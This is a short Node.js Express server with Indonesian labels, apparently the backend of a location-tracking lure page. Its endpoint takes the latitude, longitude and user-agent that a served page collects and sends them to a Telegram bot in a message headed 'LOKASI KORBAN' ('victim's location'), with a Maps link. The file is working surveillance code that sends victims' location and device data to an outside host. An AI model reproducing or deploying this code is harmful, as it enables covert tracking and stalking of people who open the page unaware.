const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/kirim', async (req, res) => {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ success: false, error: 'Bot config missing' });
  }

  const { lat, lon, status, ua } = req.body;
  const mapsLink = (lat !== '0' && lon !== '0') ? `https://www.google.com/maps?q=${lat},${lon}` : 'Tidak ada koordinat';
  
  const pesan = `<b>🎯 LOKASI KORBAN</b>\n\n<b>Status:</b> ${status}\n<b>Latitude:</b> ${lat}\n<b>Longitude:</b> ${lon}\n<b>Maps:</b> ${mapsLink}\n<b>Device:</b> ${ua}\n<b>Waktu:</b> ${new Date().toISOString()}`;
  
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { 
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' }, 
      body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' }) 
    });
    res.status(200).json({ success: true });
  } catch (error) { 
    res.status(500).json({ success: false, error: error.message }); 
  }
});

module.exports = app;
